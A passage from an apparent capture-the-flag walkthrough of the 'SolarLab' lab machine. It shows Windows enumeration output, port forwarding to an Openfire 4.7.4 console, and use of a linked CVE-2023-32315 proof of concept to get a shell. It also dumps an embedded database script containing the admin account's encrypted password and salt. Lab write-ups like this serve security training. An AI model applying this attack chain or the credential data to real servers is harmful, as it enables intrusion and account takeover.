<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>USER INFORMATION
</span></span><span style="display:flex;"><span>----------------
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>User Name      SID                                           
</span></span><span style="display:flex;"><span>============== ==============================================
</span></span><span style="display:flex;"><span>solarlab\blake S-1-5-21-3606151065-2641007806-2768514320-1000
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>GROUP INFORMATION
</span></span><span style="display:flex;"><span>-----------------
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Group Name                             Type             SID          Attributes                                        
</span></span><span style="display:flex;"><span>====================================== ================ ============ ==================================================
</span></span><span style="display:flex;"><span>Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
</span></span><span style="display:flex;"><span>BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
</span></span><span style="display:flex;"><span>NT AUTHORITY\BATCH                     Well-known group S-1-5-3      Mandatory group, Enabled by default, Enabled group
</span></span><span style="display:flex;"><span>CONSOLE LOGON                          Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
</span></span><span style="display:flex;"><span>NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
</span></span><span style="display:flex;"><span>NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
</span></span><span style="display:flex;"><span>NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
</span></span><span style="display:flex;"><span>LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
</span></span><span style="display:flex;"><span>NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
</span></span><span style="display:flex;"><span>Mandatory Label\Medium Mandatory Level Label            S-1-16-8192                                                    
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PRIVILEGES INFORMATION
</span></span><span style="display:flex;"><span>----------------------
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Privilege Name                Description                          State   
</span></span><span style="display:flex;"><span>============================= ==================================== ========
</span></span><span style="display:flex;"><span>SeShutdownPrivilege           Shut down the system                 Disabled
</span></span><span style="display:flex;"><span>SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
</span></span><span style="display:flex;"><span>SeUndockPrivilege             Remove computer from docking station Disabled
</span></span><span style="display:flex;"><span>SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
</span></span><span style="display:flex;"><span>SeTimeZonePrivilege           Change the time zone                 Disable
</span></span></code></pre></div></li>
<li>
<p><strong>Active Connections - Listening</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4960
</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       896
</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       6008
</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:6791           0.0.0.0:0              LISTENING       4960
</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       660
</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       528
</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       728
</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1564
</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       652
</span></span><span style="display:flex;"><span>  TCP    10.10.11.16:139        0.0.0.0:0              LISTENING       4
</span></span><span style="display:flex;"><span>  TCP    127.0.0.1:5000         0.0.0.0:0              LISTENING       852
</span></span><span style="display:flex;"><span>  TCP    127.0.0.1:5222         0.0.0.0:0              LISTENING       2996
</span></span><span style="display:flex;"><span>  TCP    127.0.0.1:5223         0.0.0.0:0              LISTENING       2996
</span></span><span style="display:flex;"><span>  TCP    127.0.0.1:5262         0.0.0.0:0              LISTENING       2996
</span></span><span style="display:flex;"><span>  TCP    127.0.0.1:5263         0.0.0.0:0              LISTENING       2996
</span></span><span style="display:flex;"><span>  TCP    127.0.0.1:5269         0.0.0.0:0              LISTENING       2996
</span></span><span style="display:flex;"><span>  TCP    127.0.0.1:5270         0.0.0.0:0              LISTENING       2996
</span></span><span style="display:flex;"><span>  TCP    127.0.0.1:5275         0.0.0.0:0              LISTENING       2996
</span></span><span style="display:flex;"><span>  TCP    127.0.0.1:5276         0.0.0.0:0              LISTENING       2996
</span></span><span style="display:flex;"><span>  TCP    127.0.0.1:7070         0.0.0.0:0              LISTENING       2996
</span></span><span style="display:flex;"><span>  TCP    127.0.0.1:7443         0.0.0.0:0              LISTENING       2996
</span></span><span style="display:flex;"><span>  TCP    127.0.0.1:9090         0.0.0.0:0              LISTENING       2996
</span></span><span style="display:flex;"><span>  TCP    127.0.0.1:9091         0.0.0.0:0              LISTENING       2996
</span></span><span style="display:flex;"><span>  TCP    [::]:135               [::]:0                 LISTENING       896
</span></span><span style="display:flex;"><span>  TCP    [::]:445               [::]:0                 LISTENING       4
</span></span><span style="display:flex;"><span>  TCP    [::]:5985              [::]:0                 LISTENING       4
</span></span><span style="display:flex;"><span>  TCP    [::]:47001             [::]:0                 LISTENING       4
</span></span><span style="display:flex;"><span>  TCP    [::]:49664             [::]:0                 LISTENING       660
</span></span><span style="display:flex;"><span>  TCP    [::]:49665             [::]:0                 LISTENING       528
</span></span><span style="display:flex;"><span>  TCP    [::]:49666             [::]:0                 LISTENING       728
</span></span><span style="display:flex;"><span>  TCP    [::]:49667             [::]:0                 LISTENING       1564
</span></span><span style="display:flex;"><span>  TCP    [::]:49668             [::]:0                 LISTENING       652
</span></span></code></pre></div></li>
<li>
<p><strong>Running Services on Local Interface</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>get-process -id 2996
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                  
</span></span><span style="display:flex;"><span>-------  ------    -----      -----     ------     --  -- -----------                                                  
</span></span><span style="display:flex;"><span>    967      87   318252     212752              2996   0 openfire-service  
</span></span></code></pre></div></li>
<li>
<p><strong>Users on the Local Machine</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>User accounts for \\SOLARLAB
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>-------------------------------------------------------------------------------
</span></span><span style="display:flex;"><span>Administrator            blake                    DefaultAccount           
</span></span><span style="display:flex;"><span>Guest                    openfire                 WDAGUtilityAccount 
</span></span></code></pre></div></li>
<li>
<p><strong>Openfire 4.7.4</strong></p>
<p>Openfire is running on port 9090 let&rsquo;s use chisel to forward the port.</p>
<p>Openfire version was 4.7.4 vulnerable to Admin Account Takeover. <a href="https://github.com/miko550/CVE-2023-32315">PoC</a></p>
<p>After successful exploitation got a shell as <code>openfire</code>. Testing credentials using the <code>users.db</code> I found a match.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>openfire:********
</span></span></code></pre></div><p>Found a script inside embedded-db folder.</p>
<p><strong>openfire.properties</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>SET DATABASE UNIQUE NAME HSQLDB8BDD3B2742
</span></span><span style="display:flex;"><span>SET DATABASE GC 0
</span></span><span style="display:flex;"><span>SET DATABASE DEFAULT RESULT MEMORY ROWS 0
</span></span><span style="display:flex;"><span>SET DATABASE EVENT LOG LEVEL 0
</span></span><span style="display:flex;"><span>SET DATABASE TRANSACTION CONTROL LOCKS
</span></span><span style="display:flex;"><span>SET DATABASE DEFAULT ISOLATION LEVEL READ COMMITTED
</span></span><span style="display:flex;"><span>SET DATABASE TRANSACTION ROLLBACK ON CONFLICT TRUE
</span></span><span style="display:flex;"><span>SET DATABASE TEXT TABLE DEFAULTS &#39;&#39;
</span></span><span style="display:flex;"><span>SET DATABASE SQL NAMES FALSE
</span></span><span style="display:flex;"><span>SET DATABASE SQL REFERENCES FALSE
</span></span><span style="display:flex;"><span>SET DATABASE SQL SIZE TRUE
</span></span><span style="display:flex;"><span>SET DATABASE SQL TYPES FALSE
</span></span><span style="display:flex;"><span>SET DATABASE SQL TDC DELETE TRUE
</span></span><span style="display:flex;"><span>SET DATABASE SQL TDC UPDATE TRUE
</span></span><span style="display:flex;"><span>SET DATABASE SQL CONCAT NULLS TRUE
</span></span><span style="display:flex;"><span>SET DATABASE SQL UNIQUE NULLS TRUE
</span></span><span style="display:flex;"><span>SET DATABASE SQL CONVERT TRUNCATE TRUE
</span></span><span style="display:flex;"><span>SET DATABASE SQL AVG SCALE 0
</span></span><span style="display:flex;"><span>SET DATABASE SQL DOUBLE NAN TRUE
</span></span><span style="display:flex;"><span>SET FILES WRITE DELAY 1
</span></span><span style="display:flex;"><span>SET FILES BACKUP INCREMENT TRUE
</span></span><span style="display:flex;"><span>SET FILES CACHE SIZE 10000
</span></span><span style="display:flex;"><span>SET FILES CACHE ROWS 50000
</span></span><span style="display:flex;"><span>SET FILES SCALE 32
</span></span><span style="display:flex;"><span>SET FILES LOB SCALE 32
</span></span><span style="display:flex;"><span>SET FILES DEFRAG 0
</span></span><span style="display:flex;"><span>SET FILES NIO TRUE
</span></span><span style="display:flex;"><span>SET FILES NIO SIZE 256
</span></span><span style="display:flex;"><span>SET FILES LOG TRUE
</span></span><span style="display:flex;"><span>SET FILES LOG SIZE 20
</span></span><span style="display:flex;"><span>CREATE USER SA PASSWORD DIGEST &#39;d41d8cd98f00b204e9800998ecf8427e&#39;
</span></span><span style="display:flex;"><span>ALTER USER SA SET LOCAL TRUE
</span></span><span style="display:flex;"><span>CREATE SCHEMA PUBLIC AUTHORIZATION DBA
</span></span><span style="display:flex;"><span>SET SCHEMA PUBLIC
</span></span><span style="display:flex;"><span>CREATE MEMORY TABLE PUBLIC.OFUSER(USERNAME VARCHAR(64) NOT NULL,STOREDKEY VARCHAR(32),SERVERKEY VARCHAR(32),SALT VARCHAR(32),ITERATIONS INTEGER,PLAINPASSWORD VARCHAR(32),ENCRYPTEDPASSWORD VARCHAR(255),NAME VARCHAR(100),EMAIL VARCHAR(100),CREATIONDATE VARCHAR(15) NOT NULL,MODIFICATIONDATE VARCHAR(15) NOT NULL,CONSTRAINT OFUSER_PK PRIMARY KEY(USERNAME))
</span></span><span style="display:flex;"><span>CREATE INDEX OFUSER_CDATE_IDX ON PUBLIC.OFUSER(CREATIONDATE)
</span></span><span style="display:flex;"><span>CREATE MEMORY TABLE PUBLIC.OFUSERPROP(USERNAME VARCHAR(64) NOT NULL,NAME VARCHAR(100) NOT NULL,PROPVALUE VARCHAR(4000) NOT NULL,CONSTRAINT OFUSERPROP_PK PRIMARY KEY(USERNAME,NAME))
</span></span><span style="display:flex;"><span>CREATE MEMORY TABLE PUBLIC.OFUSERFLAG(USERNAME VARCHAR(64) NOT NULL,NAME VARCHAR(100) NOT NULL,STARTTIME VARCHAR(15),ENDTIME VARCHAR(15),CONSTRAINT OFUSERFLAG_PK PRIMARY KEY(USERNAME,NAME))
</span></span><span style="display:flex;"><span>CREATE INDEX OFUSERFLAG_STIME_IDX ON PUBLIC.OFUSERFLAG(STARTTIME)
</span></span><span style="display:flex;"><span>CREATE INDEX OFUSERFLAG_ETIME_IDX ON PUBLIC.OFUSERFLAG(ENDTIME)
</span></span><span style="display:flex;"><span>CREATE MEMORY TABLE PUBLIC.OFOFFLINE(USERNAME VARCHAR(64) NOT NULL,MESSAGEID BIGINT NOT NULL,CREATIONDATE VARCHAR(15) NOT NULL,MESSAGESIZE INTEGER NOT NULL,STANZA VARCHAR(16777216) NOT NULL,CONSTRAINT OFOFFLINE_PK PRIMARY KEY(USERNAME,MESSAGEID))
</span></span><span style="display:flex;"><span>CREATE MEMORY TABLE PUBLIC.OFPRESENCE(USERNAME VARCHAR(64) NOT NULL,OFFLINEPRESENCE VARCHAR(16777216),OFFLINEDATE VARCHAR(15) NOT NULL,CONSTRAINT OFPRESENCE_PK PRIMARY KEY(USERNAME))
</span></span><span style="display:flex;"><span>CREATE MEMORY TABLE PUBLIC.OFROSTER(ROSTERID BIGINT NOT NULL,USERNAME VARCHAR(64) NOT NULL,JID VARCHAR(1024) NOT NULL,SUB INTEGER NOT NULL,ASK INTEGER NOT NULL,RECV INTEGER NOT NULL,NICK VARCHAR(255),STANZA VARCHAR(16777216),CONSTRAINT OFROSTER_PK PRIMARY KEY(ROSTERID))
</span></span><span style="display:flex;"><span>CREATE INDEX OFROSTER_USERNAME_IDX ON PUBLIC.OFROSTER(USERNAME)
</span></span><span style="display:flex;"><span>CREATE INDEX OFROSTER_JID_IDX ON PUBLIC.OFROSTER(JID)
</span></span><span style="display:flex;"><span>CREATE MEMORY TABLE PUBLIC.OFROSTERGROUPS(ROSTERID BIGINT NOT NULL,RANK INTEGER NOT NULL,GROUPNAME VARCHAR(255) NOT NULL,CONSTRAINT OFROSTERGROUPS_PK PRIMARY KEY(ROSTERID,RANK))
</span></span><span style="display:flex;"><span>CREATE INDEX OFROSTERGROUP_ROSTERID_IDX ON PUBLIC.OFROSTERGROUPS(ROSTERID)
</span></span><span style="display:flex;"><span>CREATE MEMORY TABLE PUBLIC.OFVCARD(USERNAME VARCHAR(64) NOT NULL,VCARD VARCHAR(16777216) NOT NULL,CONSTRAINT OFVCARD_PK PRIMARY KEY(USERNAME))
</span></span><span style="display:flex;"><span>CREATE MEMORY TABLE PUBLIC.OFGROUP(GROUPNAME VARCHAR(50) NOT NULL,DESCRIPTION VARCHAR(255),CONSTRAINT OFGROUP_PK PRIMARY KEY(GROUPNAME))
</span></span><span style="display:flex;"><span>CREATE MEMORY TABLE PUBLIC.OFGROUPPROP(GROUPNAME VARCHAR(50) NOT NULL,NAME VARCHAR(100) NOT NULL,PROPVALUE VARCHAR(4000) NOT NULL,CONSTRAINT OFGROUPPROP_PK PRIMARY KEY(GROUPNAME,NAME))
</span></span><span style="display:flex;"><span>CREATE MEMORY TABLE PUBLIC.OFGROUPUSER(GROUPNAME VARCHAR(50) NOT NULL,USERNAME VARCHAR(100) NOT NULL,ADMINISTRATOR INTEGER NOT NULL,CONSTRAINT OFGROUPUSER_PK PRIMARY KEY(GROUPNAME,USERNAME,ADMINISTRATOR))
</span></span><span style="display:flex;"><span>CREATE MEMORY TABLE PUBLIC.OFID(IDTYPE INTEGER NOT NULL,ID BIGINT NOT NULL,CONSTRAINT OFID_PK PRIMARY KEY(IDTYPE))
</span></span><span style="display:flex;"><span>CREATE MEMORY TABLE PUBLIC.OFPROPERTY(NAME VARCHAR(100) NOT NULL,PROPVALUE VARCHAR(4000) NOT NULL,ENCRYPTED INTEGER,IV CHARACTER(24),CONSTRAINT OFPROPERTY_PK PRIMARY KEY(NAME))
</span></span><span style="display:flex;"><span>CREATE MEMORY TABLE PUBLIC.OFVERSION(NAME VARCHAR(50) NOT NULL,VERSION INTEGER NOT NULL,CONSTRAINT OFVERSION_PK PRIMARY KEY(NAME))
</span></span><span style="display:flex;"><span>CREATE MEMORY TABLE PUBLIC.OFEXTCOMPONENTCONF(SUBDOMAIN VARCHAR(255) NOT NULL,WILDCARD INTEGER NOT NULL,SECRET VARCHAR(255),PERMISSION VARCHAR(10) NOT NULL,CONSTRAINT OFEXTCOMPONENTCONF_PK PRIMARY KEY(SUBDOMAIN))
</span></span><span style="display:flex;"><span>CREATE MEMORY TABLE PUBLIC.OFREMOTESERVERCONF(XMPPDOMAIN VARCHAR(255) NOT NULL,REMOTEPORT INTEGER,PERMISSION VARCHAR(10) NOT NULL,CONSTRAINT OFREMOTESERVERCONF_PK PRIMARY KEY(XMPPDOMAIN))
</span></span><span style="display:flex;"><span>CREATE MEMORY TABLE PUBLIC.OFPRIVACYLIST(USERNAME VARCHAR(64) NOT NULL,NAME VARCHAR(100) NOT NULL,ISDEFAULT INTEGER NOT NULL,LIST VARCHAR(16777216) NOT NULL,CONSTRAINT OFPRIVACYLIST_PK PRIMARY KEY(USERNAME,NAME))
</span></span><span style="display:flex;"><span>CREATE INDEX OFPRIVACYLIST_DEFAULT_IDX ON PUBLIC.OFPRIVACYLIST(USERNAME,ISDEFAULT)
</span></span><span style="display:flex;"><span>CREATE MEMORY TABLE PUBLIC.OFSASLAUTHORIZED(USERNAME VARCHAR(64) NOT NULL,PRINCIPAL VARCHAR(4000) NOT NULL,CONSTRAINT OFSASLAUTHORIZED_PK PRIMARY KEY(USERNAME,PRINCIPAL))
</span></span><span style="display:flex;"><span>CREATE MEMORY TABLE PUBLIC.OFSECURITYAUDITLOG(MSGID BIGINT NOT NULL,USERNAME VARCHAR(64) NOT NULL,ENTRYSTAMP BIGINT NOT NULL,SUMMARY VARCHAR(255) NOT NULL,NODE VARCHAR(255) NOT NULL,DETAILS VARCHAR(16777216),CONSTRAINT OFSECURITYAUDITLOG_PK PRIMARY KEY(MSGID))
</span></span><span style="display:flex;"><span>CREATE INDEX OFSECURITYAUDITLOG_TSTAMP_IDX ON PUBLIC.OFSECURITYAUDITLOG(ENTRYSTAMP)
</span></span><span style="display:flex;"><span>CREATE INDEX OFSECURITYAUDITLOG_UNAME_IDX ON PUBLIC.OFSECURITYAUDITLOG(USERNAME)
</span></span><span style="display:flex;"><span>CREATE MEMORY TABLE PUBLIC.OFMUCSERVICE(SERVICEID BIGINT NOT NULL,SUBDOMAIN VARCHAR(255) NOT NULL,DESCRIPTION VARCHAR(255),ISHIDDEN INTEGER NOT NULL,CONSTRAINT OFMUCSERVICE_PK PRIMARY KEY(SUBDOMAIN))
</span></span><span style="display:flex;"><span>CREATE INDEX OFMUCSERVICE_SERVICEID_IDX ON PUBLIC.OFMUCSERVICE(SERVICEID)
</span></span><span style="display:flex;"><span>CREATE MEMORY TABLE PUBLIC.OFMUCSERVICEPROP(SERVICEID BIGINT NOT NULL,NAME VARCHAR(100) NOT NULL,PROPVALUE VARCHAR(4000) NOT NULL,CONSTRAINT OFMUCSERVICEPROP_PK PRIMARY KEY(SERVICEID,NAME))
</span></span><span style="display:flex;"><span>CREATE MEMORY TABLE PUBLIC.OFMUCROOM(SERVICEID BIGINT NOT NULL,ROOMID BIGINT NOT NULL,CREATIONDATE CHARACTER(15) NOT NULL,MODIFICATIONDATE CHARACTER(15) NOT NULL,NAME VARCHAR(50) NOT NULL,NATURALNAME VARCHAR(255) NOT NULL,DESCRIPTION VARCHAR(255),LOCKEDDATE CHARACTER(15) NOT NULL,EMPTYDATE CHARACTER(15),CANCHANGESUBJECT INTEGER NOT NULL,MAXUSERS INTEGER NOT NULL,PUBLICROOM INTEGER NOT NULL,MODERATED INTEGER NOT NULL,MEMBERSONLY INTEGER NOT NULL,CANINVITE INTEGER NOT NULL,ROOMPASSWORD VARCHAR(50),CANDISCOVERJID INTEGER NOT NULL,LOGENABLED INTEGER NOT NULL,SUBJECT VARCHAR(100),ROLESTOBROADCAST INTEGER NOT NULL,USERESERVEDNICK INTEGER NOT NULL,CANCHANGENICK INTEGER NOT NULL,CANREGISTER INTEGER NOT NULL,ALLOWPM INTEGER,FMUCENABLED INTEGER,FMUCOUTBOUNDNODE VARCHAR(255),FMUCOUTBOUNDMODE INTEGER,FMUCINBOUNDNODES VARCHAR(4000),CONSTRAINT OFMUCROOM_PK PRIMARY KEY(SERVICEID,NAME))
</span></span><span style="display:flex;"><span>CREATE INDEX OFMUCROOM_ROOMID_IDX ON PUBLIC.OFMUCROOM(ROOMID)
</span></span><span style="display:flex;"><span>CREATE INDEX OFMUCROOM_SERVICEID_IDX ON PUBLIC.OFMUCROOM(SERVICEID)
</span></span><span style="display:flex;"><span>CREATE MEMORY TABLE PUBLIC.OFMUCROOMPROP(ROOMID BIGINT NOT NULL,NAME VARCHAR(100) NOT NULL,PROPVALUE VARCHAR(4000) NOT NULL,CONSTRAINT OFMUCROOMPROP_PK PRIMARY KEY(ROOMID,NAME))
</span></span><span style="display:flex;"><span>CREATE MEMORY TABLE PUBLIC.OFMUCAFFILIATION(ROOMID BIGINT NOT NULL,JID VARCHAR(1024) NOT NULL,AFFILIATION INTEGER NOT NULL,CONSTRAINT OFMUCAFFILIATION_PK PRIMARY KEY(ROOMID,JID))
</span></span><span style="display:flex;"><span>CREATE MEMORY TABLE PUBLIC.OFMUCMEMBER(ROOMID BIGINT NOT NULL,JID VARCHAR(1024) NOT NULL,NICKNAME VARCHAR(255),FIRSTNAME VARCHAR(100),LASTNAME VARCHAR(100),URL VARCHAR(100),EMAIL VARCHAR(100),FAQENTRY VARCHAR(100),CONSTRAINT OFMUCMEMBER_PK PRIMARY KEY(ROOMID,JID))
</span></span><span style="display:flex;"><span>CREATE MEMORY TABLE PUBLIC.OFMUCCONVERSATIONLOG(ROOMID BIGINT NOT NULL,MESSAGEID BIGINT NOT NULL,SENDER VARCHAR(1024) NOT NULL,NICKNAME VARCHAR(255),LOGTIME CHARACTER(15) NOT NULL,SUBJECT VARCHAR(255),BODY VARCHAR(16777216),STANZA VARCHAR(16777216))
</span></span><span style="display:flex;"><span>CREATE INDEX OFMUCCONVERSATIONLOG_ROOMTIME_IDX ON PUBLIC.OFMUCCONVERSATIONLOG(ROOMID,LOGTIME)
</span></span><span style="display:flex;"><span>CREATE INDEX OFMUCCONVERSATIONLOG_TIME_IDX ON PUBLIC.OFMUCCONVERSATIONLOG(LOGTIME)
</span></span><span style="display:flex;"><span>CREATE INDEX OFMUCCONVERSATIONLOG_MSG_ID ON PUBLIC.OFMUCCONVERSATIONLOG(MESSAGEID)
</span></span><span style="display:flex;"><span>CREATE MEMORY TABLE PUBLIC.OFPUBSUBNODE(SERVICEID VARCHAR(100) NOT NULL,NODEID VARCHAR(100) NOT NULL,LEAF INTEGER NOT NULL,CREATIONDATE CHARACTER(15) NOT NULL,MODIFICATIONDATE CHARACTER(15) NOT NULL,PARENT VARCHAR(100),DELIVERPAYLOADS INTEGER NOT NULL,MAXPAYLOADSIZE INTEGER,PERSISTITEMS INTEGER,MAXITEMS INTEGER,NOTIFYCONFIGCHANGES INTEGER NOT NULL,NOTIFYDELETE INTEGER NOT NULL,NOTIFYRETRACT INTEGER NOT NULL,PRESENCEBASED INTEGER NOT NULL,SENDITEMSUBSCRIBE INTEGER NOT NULL,PUBLISHERMODEL VARCHAR(15) NOT NULL,SUBSCRIPTIONENABLED INTEGER NOT NULL,CONFIGSUBSCRIPTION INTEGER NOT NULL,ACCESSMODEL VARCHAR(10) NOT NULL,PAYLOADTYPE VARCHAR(100),BODYXSLT VARCHAR(100),DATAFORMXSLT VARCHAR(100),CREATOR VARCHAR(1024) NOT NULL,DESCRIPTION VARCHAR(255),LANGUAGE VARCHAR(255),NAME VARCHAR(50),REPLYPOLICY VARCHAR(15),ASSOCIATIONPOLICY VARCHAR(15),MAXLEAFNODES INTEGER,CONSTRAINT OFPUBSUBNODE_PK PRIMARY KEY(SERVICEID,NODEID))
</span></span><span style="display:flex;"><span>CREATE MEMORY TABLE PUBLIC.OFPUBSUBNODEJIDS(SERVICEID VARCHAR(100) NOT NULL,NODEID VARCHAR(100) NOT NULL,JID VARCHAR(1024) NOT NULL,ASSOCIATIONTYPE VARCHAR(20) NOT NULL,CONSTRAINT OFPUBSUBNODEJIDS_PK PRIMARY KEY(SERVICEID,NODEID,JID))
</span></span><span style="display:flex;"><span>CREATE MEMORY TABLE PUBLIC.OFPUBSUBNODEGROUPS(SERVICEID VARCHAR(100) NOT NULL,NODEID VARCHAR(100) NOT NULL,ROSTERGROUP VARCHAR(100) NOT NULL)
</span></span><span style="display:flex;"><span>CREATE INDEX OFPUBSUBNODEGROUPS_IDX ON PUBLIC.OFPUBSUBNODEGROUPS(SERVICEID,NODEID)
</span></span><span style="display:flex;"><span>CREATE MEMORY TABLE PUBLIC.OFPUBSUBAFFILIATION(SERVICEID VARCHAR(100) NOT NULL,NODEID VARCHAR(100) NOT NULL,JID VARCHAR(1024) NOT NULL,AFFILIATION VARCHAR(10) NOT NULL,CONSTRAINT OFPUBSUBAFFILIATION_PK PRIMARY KEY(SERVICEID,NODEID,JID))
</span></span><span style="display:flex;"><span>CREATE MEMORY TABLE PUBLIC.OFPUBSUBITEM(SERVICEID VARCHAR(100) NOT NULL,NODEID VARCHAR(100) NOT NULL,ID VARCHAR(100) NOT NULL,JID VARCHAR(1024) NOT NULL,CREATIONDATE CHARACTER(15) NOT NULL,PAYLOAD CLOB(1G),CONSTRAINT OFPUBSUBITEM_PK PRIMARY KEY(SERVICEID,NODEID,ID))
</span></span><span style="display:flex;"><span>CREATE MEMORY TABLE PUBLIC.OFPUBSUBSUBSCRIPTION(SERVICEID VARCHAR(100) NOT NULL,NODEID VARCHAR(100) NOT NULL,ID VARCHAR(100) NOT NULL,JID VARCHAR(1024) NOT NULL,OWNER VARCHAR(1024) NOT NULL,STATE VARCHAR(15) NOT NULL,DELIVER INTEGER NOT NULL,DIGEST INTEGER NOT NULL,DIGEST_FREQUENCY INTEGER NOT NULL,EXPIRE CHARACTER(15),INCLUDEBODY INTEGER NOT NULL,SHOWVALUES VARCHAR(30) NOT NULL,SUBSCRIPTIONTYPE VARCHAR(10) NOT NULL,SUBSCRIPTIONDEPTH INTEGER NOT NULL,KEYWORD VARCHAR(200),CONSTRAINT OFPUBSUBSUBSCRIPTION_PK PRIMARY KEY(SERVICEID,NODEID,ID))
</span></span><span style="display:flex;"><span>CREATE MEMORY TABLE PUBLIC.OFPUBSUBDEFAULTCONF(SERVICEID VARCHAR(100) NOT NULL,LEAF INTEGER NOT NULL,DELIVERPAYLOADS INTEGER NOT NULL,MAXPAYLOADSIZE INTEGER NOT NULL,PERSISTITEMS INTEGER NOT NULL,MAXITEMS INTEGER NOT NULL,NOTIFYCONFIGCHANGES INTEGER NOT NULL,NOTIFYDELETE INTEGER NOT NULL,NOTIFYRETRACT INTEGER NOT NULL,PRESENCEBASED INTEGER NOT NULL,SENDITEMSUBSCRIBE INTEGER NOT NULL,PUBLISHERMODEL VARCHAR(15) NOT NULL,SUBSCRIPTIONENABLED INTEGER NOT NULL,ACCESSMODEL VARCHAR(10) NOT NULL,LANGUAGE VARCHAR(255),REPLYPOLICY VARCHAR(15),ASSOCIATIONPOLICY VARCHAR(15) NOT NULL,MAXLEAFNODES INTEGER NOT NULL,CONSTRAINT OFPUBSUBDEFAULTCONF_PK PRIMARY KEY(SERVICEID,LEAF))
</span></span><span style="display:flex;"><span>ALTER SEQUENCE SYSTEM_LOBS.LOB_ID RESTART WITH 1
</span></span><span style="display:flex;"><span>SET DATABASE DEFAULT INITIAL SCHEMA PUBLIC
</span></span><span style="display:flex;"><span>GRANT USAGE ON DOMAIN INFORMATION_SCHEMA.SQL_IDENTIFIER TO PUBLIC
</span></span><span style="display:flex;"><span>GRANT USAGE ON DOMAIN INFORMATION_SCHEMA.YES_OR_NO TO PUBLIC
</span></span><span style="display:flex;"><span>GRANT USAGE ON DOMAIN INFORMATION_SCHEMA.TIME_STAMP TO PUBLIC
</span></span><span style="display:flex;"><span>GRANT USAGE ON DOMAIN INFORMATION_SCHEMA.CARDINAL_NUMBER TO PUBLIC
</span></span><span style="display:flex;"><span>GRANT USAGE ON DOMAIN INFORMATION_SCHEMA.CHARACTER_DATA TO PUBLIC
</span></span><span style="display:flex;"><span>GRANT DBA TO SA
</span></span><span style="display:flex;"><span>SET SCHEMA SYSTEM_LOBS
</span></span><span style="display:flex;"><span>INSERT INTO BLOCKS VALUES(0,2147483647,0)
</span></span><span style="display:flex;"><span>SET SCHEMA PUBLIC
</span></span><span style="display:flex;"><span>INSERT INTO OFUSER VALUES(&#39;admin&#39;,&#39;gjMoswpK+HakPdvLIvp6eLKlYh0=&#39;,&#39;9MwNQcJ9bF4YeyZDdns5gvXp620=&#39;,&#39;yidQk5Skw11QJWTBAloAb28lYHftqa0x&#39;,4096,NULL,&#39;becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442&#39;,&#39;Administrator&#39;,&#39;admin@solarlab.htb&#39;,&#39;001700223740785&#39;,&#39;0&#39;)
</span></span><span style="display:flex;"><span>INSERT INTO OFUSERPROP VALUES(&#39;admin&#39;,&#39;console.rows_per_page&#39;,&#39;/session-summary.jsp=25&#39;)
